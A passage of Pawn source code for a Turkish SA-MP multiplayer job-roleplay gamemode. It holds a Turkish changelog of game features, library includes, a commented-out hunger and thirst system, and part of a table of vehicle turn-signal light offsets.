/*  Son Güncelleme  06/05/2018   Evoturk - TeaMStar
-/arenk1 ve /arenk2 komutlarý getirildi
-/gohome düzeltildi
-Sahipli iþyerini satýn alma bugu düzeltildi

GOHOME - EVEGÝT BÝtürlü yapamadým 2 saatim giti

|^^^^^^^^^^^\||____
| Canakkale |||""'|""\__,_
| _____________ l ||__|__|__|)
================================================================================

					          Canakkale Meslek Sunucusu
							  Meslek Sunucusu
							      V5.1.1 U7
		 	          By Umut & Canakkale Meslek Sunucusu Ekibi

================================================================================
						   Bismillahirrahmanirrahîm.
================================================================================

Örnek mesaj kullanýmlarý;
fi
TumKullanicilarMesaj("Umut Oyuna giriþ yaptý", "Umut join the game")
KullaniciMesaj(playerid, "Benim adým umut", "My name is Umut")

							Deðiþim Kayýtlarý

[1.5.6]
- Þirket sistemi eklendi.
- BoomBox sistemi eklendi.
- Anti Kýsa Mesafe eklendi.
- VIP sistemi yenilendi
- Anti Flooder sistemi eklendi
- Anti Crasher sistemi eklendi
- Feribot sistemi eklendi
- Yeni mapler eklendi
- Yeni Speed'O'Meter eklendi
- Rank sistemi eklendi
- Meslek skorlarý düzenlendi
- Pizzacý ve Makinist meslekleri eklendi
- Kurye mesleði çýkarýldý

[1.6.0]
- /convoylider komutu eklendi
- Anti Görev Bitirme Hack eklendi
- /izle /izlebitir komutlarý /spec /specoff oldu
- PM komutunun rengi griden sarýya deðiþtirildi
- Yüksek levelli adminin yazdýðý komutu düþük levelli admin göremeyecek
- /cleanupcars oyuncularýn sürdüðü araçlarda iþlemeyecek

[1.6.2]
- Speed'O'Meter barlarý yeniden düzenlendi
- Tekli araç silmeye ve respawn etmeye yarayan /dcar ve /scar komutlarý eklendi
- /animlist komutu eklendi
- Ýþyeri sisteminin komutlarýnda Türkçeleþtirme yapýldý

[1.6.3]
- Konvoyda liderle ayný araca bilmeyenler lidere bildirilecek
- /convoybilgi komutu eklendi
- SendAdminText TextDraw'a alýndý
- meslekText[playerid] bugu çözüldü ( Konvoy textiyle çakýþýyordu )
- Ufak Türkçeleþtirmeler yapýldý

[1.6.5]
- /respawncars komutu ile ilgili düzenleme yapýldý
- Otobüsçülüðün getirdiði para bir miktar arttýrýldý
- Bazý deðerli görülen yüklerin getirdiði para arttýrýldý
- Bazý Türkçeleþtirme hatalarý düzeltildi
- AutoEvict süresi 2 günden 7 güne uzatýldý
- Bazý yüklerin verdiði para bir miktar arttýrýldý
- Bazý mesleklerin skorlarý düzenlendi ( Mafya => 100 | Yol Ýþçisi => 0 )
- 3D Textlerle ilgili buglara çözüm getirilmeye çalýþýldý
- /cleanupcars'ta Þirket Dorsesinin silinmesine çözüm getirildi.
- Random Server HostName sistemi eklendi
- Etkinlik sisteminde silah verememe sorunu düzeltildi
- Radar yazýsý görüþ mesafesi arttýrýldý
- SendClientMessage'den duyuru yapan /asay komutu eklendi
- /respawncars ve /cleanupcars komutlarý 5 levela alýndý

[1.6.6]
- Vites sistemi eklendi
- ???

[1.6.7]
- Otomatik vites varsayýlan olarak düzenlendi
- /adminol ve /fsetlevel komutlarý geldi
- Þirket dorsesi indirme buguna çözüm getirildi
- Araç Sahibi yazýsý buguna çözüm getirildi
- Loto sisteminin buglarý düzeltildi
- /karakol bugu düzeltildi
- Mod optimizasyon çalýþmasý yapýldý

[1.6.8]
- Yöneticiler için MP3 arþiv sistemi eklendi ( /mp3arsiv )
- Bazý yönetici komutlarýnýn seviyeleri deðiþtirildi
- Bilgilendirici içerik biraz daha arttýrýldý
- /komutlar komutunun þekli düzenlendi
- /komutlar komutundaki komutlarýn sýrasý ve leveli güncellendi

[1.6.9]
- Sellektörde düzeltme yapýldý
- Geri vites uyarý sesi çýkmama sorunu çözüldü
- Asistan bugu kaldýrýldý
- Anti Car Jack sistemindeki buga çözüm getirildi
- /karakol komutu oyunda polis varken iþlemeyecek

[1.7.0]
- SF'ye bir þirket mapi eklendi/
- LS-SF yoluna yol yapým çalýþmasý mapi eklendi
- Yük yeri dinlenme tesisi mapi eklendi
- Sisteme "Yeni Sanayi" adýnda yükleme yeri eklendi
- Arþivdeki MP3 sýnýrý 200'den 2000'e çýkarýldý
- Þirket üzerinden uçakla geçerken þirket kapýsý önüne atýlma bugu çözüldü
- Þirket araçlarý sisteminde bug fix çalýþmasý yapýldý
- FPS bugu için çözüm çalýþmasý yapýldý
- DFT30'daki inek sistemi ile ilgili çalýþma yapýldý
- Ehliyet alma yerinde tren ehliyeti kaldýrýldý
- Yönetici müzik açýnca radyo dinleyenler etkilenmeyecek

[1.7.2]
- Kastamonu City Map'i eklendi
- Kastamonu City Map'inde yeni nesil tabela sistemi kullanýldý
- Konvoy içi chat için /c komutu eklendi
- Kamyoncular için "Kastamonu Yeni Yol Tesisleri" Locationu
- Kamyoncular için "Kastamonu Munko Sunta AÞ" Locationu
- Kamyoncular için "Kastamonu Yeni Sanayi" Locationu
- Kamyoncular için "Kastamonu International Airport" Locationu
- Kamyoncular için "Kastamonu Lider Kargo" Locationu
- Kamyoncular için "Kastamonu RS Haul" Locationu
- Pilotlar için "Kastamonu International Airport" Locationu ve Spawn Yeri
- /rescue komutuyla þirket mekanýna ýþýnlanabilme özelliði eklendi
- Oyuncu /bonus yazdýðýnda bonus görev sadece kendisine gözükecek
- /sabithiz komutu eklendi
- Sinyal sistemi eklendi (Q ve E komutlarý)
- MP3 Arþiv sistemindeki ufak bir buga çözüm getirildi
- /saat (/mytime) ve /hava (/myweather) komutlarý eklendi
- N00B's Island tamamen kaldýrýldý

[1.7.3]

- Chat Acma/Kapatma Komutu Eklendi /chatengelle
- Oyuncuyu Yakma Komutu Eklendi /yak
- Bir Vehicleyi Yanina Cekme Eklendi /acget
- Silah Ýzni Verme Komutu Eklendi ( Öldügünde SilahIzni =0;) /silahizni
- Fu Player Komutu Eklendi.
- Herkezin Yildizini Degiþtirme Eklendi /setallwanted
- /freezeAll - /Unfreezeall - /spawnall /gpcall ( herkeze araba verir )
- /afpolis - /aftirci
- sabithiz komutu silindi :D :D
- Sinyal num 4 ve num 6 tuþlarýna atandý
- Bazý buglar düzeltildi

[1.7.5]

- Server Kapanýþtan Sonra Göz Boyamak Adýna Login TextDrawn Yapildi.
- Giriþ Ekraninda Dans Ve Müzik Eklendi.
- Spawn Oldukdan Sonra Bilgi Mesaji Eklendi. ( Copy Paste )
- Kücücük Fixler Geldi.
- Araç Labelleri ile ilgili Testler Yapildi.
- Feribot Yolu Degiþti Giþe Eklendi. *
- Oyun Sýfýrlandi Yedekleri VDS üzerine alindi.
- Onaylanmýþ Üye Özelligi Geldi. 250 SKOR
- Polis Skoru 500 Oldu.

[2.0.0]

- Yeni Oyuncu Arayüzü eklendi
- Mevcut radyo sistemi kaldýrýldý
- TextDraw arayüzlü MP3 ve Radyo çalar sistemi getirildi ( MP3 Arþiv Sistemi v2 )
- Spec'de olan birisine /goto ve /get komutlarý uygulanamayacak
- Tugis Island, Central Truck Depot, Furkan's Island kaldýrýldý
- Madison Island yenilendi
- Tünelli LS ve LV Giriþli Ada Map'i eklendi
- Tren Sistemi eklendi
- Günlük Log sistemi eklendi
- Yük alma býrakma yerleri güncellendi
- Otobüsçülük mesleði yenilendi
- /textkapat komutu eklendi
- Gemicilik mesleði eklendi
- Porto Tugay, LS Liman, SF Liman, LV Liman mapleri eklendi
- Gameroglu Ev mapi eklendi
- Odunculuk mesleði eklendi ( + /odunsat )
- /pmon ve /pmoff komutlarý eklendi
- VIP'ler için /getdorse komutu eklendi
- VIP'ler artýk görevlerden 3 katý kadar para ve skor kazanacak
- Balýkçý mesleði eklendi ( + /baliksat )
- Yöneticiler /write komutu eklendi
- Araç sahibi, Þirket aracý yazýlarýnda oluþan buga çözüm yapýldý
- Etkinliklere artýk /etkgit yazýlýp girilecek
- /stats menüsü yenilendi
- Gizli kasa sayýsý 30'a çýkarýldý
- Gizli kasa yerleri deðiþtirildi
- Her gizli kasa 5k$ ve 5 skor verir, hepsi tamamlandýðýnda ek olarak 1m ve 100 skor

[2.0.1]

- Konvoydan üye çýkaramama bugu giderildi
- AKA Sistemi eklendi (/aka)
- /bonus komutunun renkleri düzenlendi

[2.0.2]

- /bugodul komutu /odul olarak deðiþtirildi
- Anti Hile Sistemi admin yokken algýladýklarý oyuncularý oyundan atacak
- Müzik Dükkaný ve Kýyafet Dükkaný interioru mapi eklendi
- Görevlerle ilgili bug fixler yapýldý
- Etkinliðe gidildiðinde var olan görev iptal edilecek
- Etkinlikteki oyuncular birbirlerini vurduklarýnda aranmayacaklar
- Adminler için offline þirketten atma komutu eklendi (/sirketat)
- Yük yerleri güncellendi
- Týbbi Atýk ve Silah yük tipleri eklendi

[2.0.3]

- Ev sistemine Level 11 Ev Interioru(Rezidans) eklendi
- Gemi ehliyeti eklendi
- Araç fiyatlarý yenilendi ve yeni araçlar eklendi
- Oduncu bugu düzeltildi
- /vipbilgi düzenlendi

================================================================================
*/


#pragma tabsize 0

#define GameModeName				"Turkiye / Canakkale"

// ********************************************************************************************************************
// Limit the amount of cops with a value greater than 0
// Setting this to "3" would mean:
// - having 3 normal players (non-cop players) before the first cop can join the server
// - having 6 normal players before 2 cops can be active
// - having 9 normal players before the third cop can join and so on
// Leaving this at 0 disables the police-limitation, so anyone can choose the police class anytime
// ********************************************************************************************************************

new PlayersBeforePolice	= 0;





// ********************************************************************************************************************
// Include default files

#include <a_samp>
#include <zcmd>
#include <sscanf2>
#include <streamer>
#include <foreach>
#include <dini>
#include <YSI\y_ini>
#include "YSI\y_hooks"
#include "easy-mysql"
#include "evf"
#include "strlib"
#include "flash"
#include <SII>

#include <fusiach> // Baþarým sistemi

//SERIAL

native gpci(playerid, serial[], maxlen);

// Ev Sistemi parçasý
#define     LIMIT_PER_PLAYER    (3)

// [ Dinamik hastane pickup sistemi by Umut. ] ==========================================

#define MAX_HASTANE_PICK 100

#define HastanePickKayitSure 5 // Hastane Pickup ikonlarýnýn kaç dakikada bir kayýt olacaðýný ayarlar DAKÝKA ÜZERÝNDENDÝR!

new Iterator: HastanePickups<MAX_HASTANE_PICK>, bool: PlayerEditingPickup[MAX_PLAYERS];//, mpQuery[500];

enum hpInfo
{
	Float: mpEnterX,
	Float: mpEnterY,
	Float: mpEnterZ,
	mpVirtualWorld,
	hasPickup,
	Text3D: hasLabel
};
new HastanePickInfo[MAX_HASTANE_PICK][hpInfo];


// =============================================================================

/*
// [ Açlýk & Susuzluk sistemi by Umut] =========================================
#include <progress_e> // Progress bar için kullandýðým ÝNC dosyasý
new
	pAclik[MAX_PLAYERS] = 100,
	pAclikZaman[MAX_PLAYERS] = -1,
	pAclikZaman2[MAX_PLAYERS] = -1,
	Bar:pAclikBar[MAX_PLAYERS],
	pBarKullan[MAX_PLAYERS],
	aclikEksiltmeTimer[MAX_PLAYERS]
;

#define ACLIK_KONTROL       (30) // susuzluk ve açlýk kaç saniyede bir azalsýn?
#define ACLIK_CAN_SURE		(20) // açlýk sýfýr olunca kaç saniyede bir can azalsýn?

forward public pAclikZaman_h(oyuncu_id);
public pAclikZaman_h(oyuncu_id)
{
	new
	    Float: oyuncu_can
	;
	GetPlayerHealth(oyuncu_id, oyuncu_can);
	if(oyuncu_can > 5)
	{
 		SetPlayerHealth(oyuncu_id, oyuncu_can-1);
 		print("can1");
	}else{
	    SendClientMessage(oyuncu_id, -1, "{FF0000}[AÇLIK]{FFFFFF} Açlýktan ölmek üzeresin acilen birþeyler yemelisin");
	}
	if(pAclikZaman2[oyuncu_id] != -1) KillTimer(pAclikZaman2[oyuncu_id]);
	if(pAclik[oyuncu_id] < 1)aclikEksiltmeTimer[oyuncu_id] = SetTimerEx("pAclikZaman_h", ACLIK_CAN_SURE*1000, false, "i", oyuncu_id);
    if(pAclik[oyuncu_id] >= 1)KillTimer(aclikEksiltmeTimer[oyuncu_id]);
	KillTimer(pAclikZaman[oyuncu_id]);
	return (true);
}

forward public pAclikZaman_f(oyuncu_id);
public pAclikZaman_f(oyuncu_id)
{
	if(pAclik[oyuncu_id] < 1)
	{
		new
		    Float: oyuncu_can
		;
		GetPlayerHealth(oyuncu_id, oyuncu_can);
		SetPlayerHealth(oyuncu_id, oyuncu_can-1);
		print("can2");
		if(pAclikZaman2[oyuncu_id] != -1) KillTimer(pAclikZaman2[oyuncu_id]);
		aclikEksiltmeTimer[oyuncu_id] = SetTimerEx("pAclikZaman_h", ACLIK_CAN_SURE*1000, false, "i", oyuncu_id);
		KillTimer(pAclikZaman[oyuncu_id]);
	}
	else
	{
	    aclikAzalt(oyuncu_id, 1);
		if(pAclikZaman[oyuncu_id] != -1) KillTimer(pAclikZaman[oyuncu_id]);
		pAclikZaman[oyuncu_id] = SetTimerEx("pAclikZaman_f", ACLIK_KONTROL*1000, false, "i", oyuncu_id);
	}
	return (true);
}

stock aclikArttir(oyuncu_id, Float:Deger)
{
    pAclik[oyuncu_id] += floatround(Deger, floatround_round);
	if(pBarKullan[oyuncu_id] == 1)
	{
		SetProgressBarValue(pAclikBar[oyuncu_id], GetProgressBarValue(pAclikBar[oyuncu_id])+Deger);
    	UpdateProgressBar(pAclikBar[oyuncu_id], oyuncu_id);
	}
	return 1;
}

stock aclikAzalt(oyuncu_id, Float:Deger)
{
    pAclik[oyuncu_id] -= floatround(Deger, floatround_round);
    if(pBarKullan[oyuncu_id] == 1)
	{
		SetProgressBarValue(pAclikBar[oyuncu_id], GetProgressBarValue(pAclikBar[oyuncu_id])-Deger);
    	UpdateProgressBar(pAclikBar[oyuncu_id], oyuncu_id);
	}
	return 1;
}

stock aclikAyarla(oyuncu_id, Float:Deger)
{
    pAclik[oyuncu_id] = floatround(Deger, floatround_round);
    if(pBarKullan[oyuncu_id] == 1)
	{
		SetProgressBarValue(pAclikBar[oyuncu_id], Deger);
    	UpdateProgressBar(pAclikBar[oyuncu_id], oyuncu_id);
	}
	return 1;
}


new
	pSusuzluk[MAX_PLAYERS] = 100,
	pSusuzlukZaman[MAX_PLAYERS] = -1,
	pSusuzlukZaman2[MAX_PLAYERS] = -1,
	Bar:pSusuzlukBar[MAX_PLAYERS],
	susuzlukEksiltmeTimer[MAX_PLAYERS]
;

#define SUSUZLUK_KONTROL       (30) // susuzluk ve açlýk kaç saniyede bir azalsýn?
#define SUSUZLUK_CAN_SURE		(20) // açlýk sýfýr olunca kaç saniyede bir can azalsýn?

forward public pSusuzlukZaman_h(oyuncu_id);
public pSusuzlukZaman_h(oyuncu_id)
{
	new
	    Float: oyuncu_can
	;
	GetPlayerHealth(oyuncu_id, oyuncu_can);
	if(oyuncu_can > 5)
	{
 		SetPlayerHealth(oyuncu_id, oyuncu_can-1);
 		print("can3");
	}else{
	    SendClientMessage(oyuncu_id, -1, "{FF0000}[SUSUZLUK]{FFFFFF} Susuzlukan ölmek üzeresin acilen birþeyler içmelisin");
	}
	if(pSusuzlukZaman2[oyuncu_id] != -1) KillTimer(pSusuzlukZaman2[oyuncu_id]);
	if(pSusuzluk[oyuncu_id] < 1) susuzlukEksiltmeTimer[oyuncu_id] = SetTimerEx("pSusuzlukZaman_h", SUSUZLUK_CAN_SURE*1000, false, "i", oyuncu_id);
	if(pSusuzluk[oyuncu_id] >= 1) KillTimer(susuzlukEksiltmeTimer[oyuncu_id]);
	KillTimer(pSusuzlukZaman[oyuncu_id]);
	return (true);
}

forward public pSusuzlukZaman_f(oyuncu_id);
public pSusuzlukZaman_f(oyuncu_id)
{
	if(pSusuzluk[oyuncu_id] < 1)
	{
		new
		    Float: oyuncu_can
		;
		GetPlayerHealth(oyuncu_id, oyuncu_can);
		SetPlayerHealth(oyuncu_id, oyuncu_can-1);
		print("can4");
		if(pSusuzlukZaman2[oyuncu_id] != -1) KillTimer(pSusuzlukZaman2[oyuncu_id]);
		susuzlukEksiltmeTimer[oyuncu_id] = SetTimerEx("pSusuzlukZaman_h", SUSUZLUK_CAN_SURE*1000, false, "i", oyuncu_id);
		KillTimer(pSusuzlukZaman[oyuncu_id]);
	}
	else
	{
	    susuzlukAzalt(oyuncu_id, 1);
		if(pSusuzlukZaman[oyuncu_id] != -1) KillTimer(pSusuzlukZaman[oyuncu_id]);
		pSusuzlukZaman[oyuncu_id] = SetTimerEx("pSusuzlukZaman_f", SUSUZLUK_KONTROL*1000, false, "i", oyuncu_id);
	}
	return (true);
}

stock susuzlukArttir(oyuncu_id, Float:Deger)
{
    pSusuzluk[oyuncu_id] += floatround(Deger, floatround_round);
	if(pBarKullan[oyuncu_id] == 1)
	{
		SetProgressBarValue(pSusuzlukBar[oyuncu_id], GetProgressBarValue(pSusuzlukBar[oyuncu_id])+Deger);
    	UpdateProgressBar(pSusuzlukBar[oyuncu_id], oyuncu_id);
	}
	return 1;
}

stock susuzlukAzalt(oyuncu_id, Float:Deger)
{
    pSusuzluk[oyuncu_id] -= floatround(Deger, floatround_round);
    if(pBarKullan[oyuncu_id] == 1)
	{
		SetProgressBarValue(pSusuzlukBar[oyuncu_id], GetProgressBarValue(pSusuzlukBar[oyuncu_id])-Deger);
    	UpdateProgressBar(pSusuzlukBar[oyuncu_id], oyuncu_id);
	}
	return 1;
}

stock susuzlukAyarla(oyuncu_id, Float:Deger)
{
    pSusuzluk[oyuncu_id] = floatround(Deger, floatround_round);
    if(pBarKullan[oyuncu_id] == 1)
	{
		SetProgressBarValue(pSusuzlukBar[oyuncu_id], Deger);
    	UpdateProgressBar(pSusuzlukBar[oyuncu_id], oyuncu_id);
	}
	return 1;
}
*/
// =============================================================================

// otorenk on of


new bool: playerChangeColor[MAX_PLAYERS char];





// [ Araç Sinyal Sistemi (Reiss_Umut) ] ========================================
//===========================================================
/*
                            CONFIG
*/

#define BLINK_DISABLE_ON_EXIT_VEHICLE   1   // 0 - 1 = IF 1, blinks will be disabled when player exits his car with enabled, but still work for emergency blinks.
#define BLINK_ALLOW_EMERGENCY           1   // 0 - 1, allow player to enable emergency lights.
//===========================================================

new tmodetype[MAX_PLAYERS];

new PilotUcak[MAX_PLAYERS];

/////////////////////////////////////
#define BLINK_TURN_ANGLE 55.0

new Blink[MAX_VEHICLES][4];
new BlinkSide[MAX_VEHICLES];
new Float:BlinkR[MAX_VEHICLES];
new BlinkTrailer[MAX_VEHICLES];
new TrailerVehicle[MAX_VEHICLES];


forward DestroyVehicleEx(&vehicleid);//m1m2 araçlar TeaMStar

forward B_OnTrailerDetached(trailerid, fromvehicleid);
forward B_OnTrailerAttached(trailerid, tovehicleid);
forward B_TrailerCheck();
forward B_DisableBlinks(vehicleid); //For external call in GM when you want to destroy vehicle. CallRemoteFunction("B_DisableBlinks", "i", vehicleid);

enum eBO {
    bM, Float:bX, Float:bY, Float:bZ, Float:brX, Float:brY, Float:brZ
};

new BlinkOffset[][eBO] = {
    {400, -0.9001, 2.0490, -0.0965, -0.9605, -2.2404, -0.0965},
    {401, -0.9686, 2.5393, 0.0235, -0.9970, -2.2863, 0.0235},
    {402, -0.8788, 2.5160, -0.0565, -0.9208, -2.5936, 0.0435},
    {403, -1.3897, 3.6007, -0.2194, -1.1904, -0.9415, 1.8389},
    {404, -0.7236, 2.1715, -0.0365, -0.7906, -2.7052, 0.0635},
    {405, -0.9127, 2.2766, -0.0565, -0.8723, -2.6526, -0.0565},
    {406, -2.2165, 4.9242, -0.0332, -2.0785, -5.2054, 0.5468},
    {407, -0.9887, 4.0622, -0.0913, -1.0141, -3.4034, -0.0913},
    {408, -0.9659, 4.7615, -0.2513, -0.8430, -3.9722, -0.5113},
    {409, -0.7859, 3.5522, -0.0313, -0.8027, -3.8228, -0.0313},
    {410, -0.825, 2.105, 0.0635, -0.8723, -2.1926, 0.1235},
    {411, -0.9405, 2.6710, -0.1825, -0.9636, -2.4525, 0.0825},
    {412, -0.8965, 2.6478, -0.0575, -0.9592, -3.4870, -0.1575},
    {413, -0.8669, 2.5464, -0.0913, -0.8209, -2.5829, 0.0687},
    {414, -0.8069, 2.7473, 0.0087, -0.9058, -3.2050, 0.1094},
    {415, -0.8738, 2.4866, -0.2357, -0.7792, -2.3501, 0.0450},
    {416, -0.8469, 2.9073, 0.0087, -1.0352, -3.5937, 1.4522},
    {417, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {418, -0.9511, 2.3820, -0.2357, -1.0081, -2.4904, -0.1557},
    {419, -1.0742, 2.3978, -0.1757, -0.8127, -2.8620, -0.1557},
    {420, -1.0142, 2.2978, -0.0157, -0.9637, -2.6744, 0.0043},
    {421, -0.9013, 2.5343, -0.1357, -0.5921, -2.9228, -0.1957},
    {422, -0.7813, 2.1543, -0.2657, -0.8985, -2.4349, -0.1057},
    {423, -0.7817, 2.2093, -0.0313, -0.8340, -2.1794, 0.0596},
    {424, -0.7350, 1.4505, 0.1087, -0.7062, -1.4778, 0.2996},
    {425, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {426, -1.0006, 2.3164, -0.0100, -0.9627, -2.6930, -0.0100},
    {427, -0.8728, 2.5856, 0.1887, -0.9831, -3.8383, -0.3495},
    {428, -0.8728, 2.5856, -0.2103, -0.9045, -2.8871, 1.2466},
    {429, -0.7942, 2.2846, -0.2500, -0.8397, -2.3849, -0.0070},
    {430, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {431, -0.9771, 5.8479, 0.3497, -1.0300, -5.7043, -0.1041},
    {432, -1.7168, 4.0330, 0.4497, -1.5830, -4.3414, 0.7039},
    {433, -1.2619, 3.7708, -0.2163, -1.2966, -4.6534, -0.1051},
    {434, 0.0, 0.0, 0.0, -0.4811, -1.9838, -0.0670},
    {435, 0.0000, 0.0000, 0.0000, -1.0697, -3.9690, -1.1053}, //trailer
    {436, -0.8495, 2.2519, -0.0070, -0.8948, -2.4838, 0.1130},
    {437, -1.1156, 5.5395, -0.2163, -0.9856, -5.3099, 1.6458},
    {438, -1.1128, 2.3675, -0.2870, -1.0992, -2.4601, -0.2870},
    {439, -0.8381, 2.3101, -0.1470, -0.8221, -2.6534, -0.1070},
    {440, -0.8270, 2.5573, -0.3173, -0.8676, -2.5376, -0.0149},
    {441, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {442, -1.0354, 2.8278, -0.1870, -1.0226, -3.0877, -0.1270},
    {443, -1.0610, 5.7528, -0.9573, -1.2388, -7.1392, -0.8250},
    {444, -0.9880, 2.7188, 0.6140, -1.0722, -3.0184, 0.7248},
    {445, -0.9590, 2.3460, -0.0840, -0.9773, -2.8049, -0.0840},
    {446, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {447, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {448,  -0.1992, -0.9229, -0.1270},
    {449, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {450,  0.0000, 0.0000, 0.0000, -1.0697, -3.9690, -1.1053}, //trailer
    {451, -0.9826, 1.9642, -0.1399, -0.8894, -2.3991, -0.0199},
    {452, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {453, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {454, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {455, 0.0000, 0.0000, 0.0000, -1.3866, -4.5162, -0.7399},
    {456, 0.0000, 0.0000, 0.0000, -1.3045, -4.6123, 0.4601},
    {457, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {458, -0.9513, 2.4197, -0.1399, -0.9703, -2.7779, 0.0201},
    {459, -0.8214, 2.5716, -0.1274, -0.8760, -2.5775, 0.1127},
    {460, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {461, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {462, 0.0000, 0.0000, 0.0000, -0.2054, -0.9359, -0.1399},
    {463, -0.2276, 0.7185, 0.3201, -0.1952, -1.0037, 0.1601},
    {464, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {465, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {466, 0.0000, 0.0000, 0.0000, -1.0201, -2.7994, 0.0401},
    {467, 0.0000, 0.0000, 0.0000, -0.9401, -3.0594, 0.1601},
    {468, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {469, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {470, -1.0259, 2.1382, 0.2001, -1.0433, -2.5463, 0.1201},
    {471, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {472, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {473, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {474, 0.0000, 0.0000, 0.0000, -0.9833, -2.7663, -0.0599},
    {475, -0.8681, 2.4086, -0.3399, -0.8632, -2.7629, -0.2399},
    {476, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {477, -0.8081, 2.6686, -0.1999, -0.9945, -2.6987, 0.0801},
    {478, -1.0938, 2.0255, 0.1001, -1.0579, -2.5378, -0.2799},
    {479, -0.9671, 2.4844, 0.0201, -0.9578, -2.7556, 0.0601},
    {480, -0.5897, 2.2607, -0.4399, -0.9183, -2.3388, -0.1399},
    {481, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {482, -0.8841, 2.4094, -0.3399, -0.8685, -2.5676, 0.0201},
    {483, -0.7770, 2.6235, -0.0199, -0.6709, -2.7712, -0.1999},
    {484,  0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {485, -0.6104, 1.7180, 0.2201, -0.7074, -1.3681, 0.1201},
    {486, 0.0000, 0.0000, 0.0000, -0.5919, -3.2353, 0.9601},
    {487, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {488, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {489, -1.1024, 2.5796, 0.0401, -1.1261, -2.6473, 0.1601},
    {490, -1.0971, 3.1462, 0.0401, -1.1327, -3.1055, 0.1601},
    {491, -0.8495, 2.5284, -0.0799, -0.8870, -2.7776, 0.0001},
    {492, -0.7905, 2.4656, -0.0599, -0.9075, -2.8130, 0.0001},
    {493, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {494, -0.8513, 2.3630, -0.2199, -0.8275, -2.8485, 0.1401},
    {495, -1.0909, 2.3818, 0.0001, -1.1540, -2.1156, -0.0399},
    {496, -0.9219, 2.1787, 0.0401, -0.7095, -2.1087, 0.0801},
    {497, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000, 0.0000},
    {498, -0.8915, 3.0670, 0.2201, -0.9740, -3.0460, 0.3601},
    {499, -0.7725, 2.4576, -0.1999, -1.1318, -3.4186, 0.1401},
    {500, -0.9152, 1.9097, -0.0355, -0.7552, -1.9266, -0.0355},
    {501, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {502, -0.8723, 2.5986, -0.1770, 0.0, 0.0, 0.0},
    {503, -0.8579, 2.3582, -0.0213, 0.0, 0.0, 0.0},
    {504, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {505, -1.1068, 2.5744, 0.0086, -1.1365, -2.6250, 0.1679},
    {506, -0.7672, 2.2106, -0.3185, -0.9113, -2.3474, -0.0273},
    {507, -1.1143, 2.6057, -0.0456, -1.1410, -2.9714, -0.0456},
    {508, -0.7012, 3.0199, -0.6678, -1.3807, -3.3356, 1.2628},
    {509, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {510, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {511, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {512, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {513, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {514, -1.2341, 4.2204, 0.0806, 0.0, 0.0, 0.0},
    {515, -1.4241, 4.4811, -0.7354, -1.2973, -4.8274, -0.8974},
    {516, -0.9512, 2.7208, -0.0543, -0.9926, -2.7809, -0.0348},
    {517, -0.9401, 2.7868, -0.0726, -1.0208, -2.7461, -0.1324},
    {518, -0.9166, 2.6548, -0.0487, -1.0124, -2.8219, -0.0487}, //fake
    {519, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {520, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {521, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {522, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {523, -0.2607, 0.6038, 0.2881, -0.1973, -0.9958, 0.0638},
    {524, -0.9279, 3.6538, -0.0473, -1.3003, -3.9309, -1.0661}, //fake back
    {525, -0.8576, 2.9431, 0.1425, -1.0428, -2.9851, -0.1486}, //fake back
    {526, -0.9421, 2.3087, -0.1128, -0.9559, -2.2882, -0.0411},
    {527, -0.9351, 2.4078, -0.0242, -0.9825, -2.2344, 0.0844},
    {528, -0.8783, 2.5102, -0.1526, -0.8133, -2.5965, -0.3237}, //fake back
    {529, -1.0177, 2.5256, 0.0698, -1.0505, -2.5713, 0.2047},
    {530, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
    {531, -0.4216, 1.5030, -0.1191, -0.5225, -1.0517, 0.4484}, //fake
    {532, -4.0331, 3.9619, -0.9118, -1.5976, -0.3739, 0.4484}, //fake!
    {533, -0.9410, 2.3774, 0.0985, -0.9852, -2.4663, -0.0020},
    {534, -1.0159, 2.9278, -0.1698, -0.8236, -2.7548, -0.0574},
    {535, -0.8265, 2.5014, -0.2084, -0.9267, -2.6058, -0.1784},
    {536, -0.8577, 2.3943, -0.1248, -0.8736, -3.0999, -0.0900},
    {537, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},
